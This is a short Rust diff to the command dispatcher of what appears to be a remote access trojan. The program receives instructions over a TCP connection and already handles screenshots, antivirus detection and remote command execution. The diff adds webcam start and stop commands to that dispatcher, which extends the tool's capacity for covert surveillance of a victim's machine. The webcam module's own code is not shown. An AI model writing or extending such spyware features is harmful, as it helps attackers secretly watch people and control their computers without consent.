@@ -3,6 +3,7 @@ use std::net::TcpStream;
 use shared::InstructMessage;
 
 pub mod filesystem;
+pub mod webcam;
 pub mod system;
 pub mod exec;
 
@@ -18,6 +19,9 @@ pub fn dispatch(instruct: InstructMessage, conn: &mut TcpStream) -> Result<bool,
         InstructMessage::Display(content) => system::display_message(content), // display
         InstructMessage::Screenshot => system::screenshot(conn), // check
         InstructMessage::AntiVirus => system::av(conn), // check
+
+        InstructMessage::WebCam(port) => webcam::run(conn, &port),
+        InstructMessage::CloseWebCam => webcam::close(),
 
         InstructMessage::Exec(cmd) => exec::run(conn, cmd),
         // InstructMessage::Shell => exec::run(conn),
